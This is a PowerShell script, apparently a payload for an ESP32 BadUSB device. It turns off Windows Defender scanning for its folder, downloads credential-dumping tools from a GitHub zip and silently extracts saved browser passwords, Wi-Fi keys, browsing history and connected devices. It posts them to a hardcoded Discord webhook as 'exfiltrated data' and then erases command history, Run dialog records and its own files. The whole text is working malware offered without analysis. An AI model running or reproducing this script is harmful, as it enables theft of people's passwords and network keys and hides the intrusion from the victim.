#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\$env:USERNAME\Downloads\scripts"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
Add-MpPreference -ExclusionPath $basePath -Force

# Download and extract tools
$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
Invoke-WebRequest $zipUrl -OutFile "tools.zip"
Expand-Archive -Path "tools.zip" -DestinationPath "." -Force

# Run 4 tools
Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden

# Wait for files (60 seconds max)
$maxWait = 60
$waited = 0
while ($waited -lt $maxWait) {
    if ((Test-Path "passwords.txt") -or (Test-Path "wifi.txt") -or (Test-Path "connected_devices.txt") -or (Test-Path "history.txt")) {
        break
    }
    Start-Sleep -Seconds 1
    $waited++
}

# Discord webhook
$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"

# Send file as attachment (file đính kèm)
function Send-FileAttachmentToDiscord {
    param([string]$FilePath)
    
    if (!(Test-Path $FilePath)) { 
        Write-Output "❌ File không tồn tại: $FilePath"
        return 
    }
    
    $fileName = [System.IO.Path]::GetFileName($FilePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
    
    $boundary = [System.Guid]::NewGuid().ToString()
    $multipartContent = @"
--$boundary
Content-Disposition: form-data; name="file1"; filename="$fileName"
Content-Type: text/plain

$fileBase64
--$boundary--
"@
    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
    
    try {
        $response = Invoke-RestMethod -Uri $hookurl -Method Post -Body $multipartContent -Headers $headers -UseBasicParsing
        Write-Output "✅ Đã gửi: $fileName"
    } catch {
        Write-Output "❌ Lỗi gửi $fileName : $_"
    }
}

# Send message with file list first
$payload = @{ content = "**📁 Exfiltrated data from $env:COMPUTERNAME - $env:USERNAME**" } | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing

# Send each file as attachment
Send-FileAttachmentToDiscord -FilePath ".\passwords.txt"
Send-FileAttachmentToDiscord -FilePath ".\wifi.txt"
Send-FileAttachmentToDiscord -FilePath ".\connected_devices.txt"
Send-FileAttachmentToDiscord -FilePath ".\history.txt"

# Cleanup
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
} catch {}

Set-Location "C:\"
Remove-Item -Path $basePath -Recurse -Force
Remove-MpPreference -ExclusionPath $basePath -Force

Stop-Process -Id $PID -Force
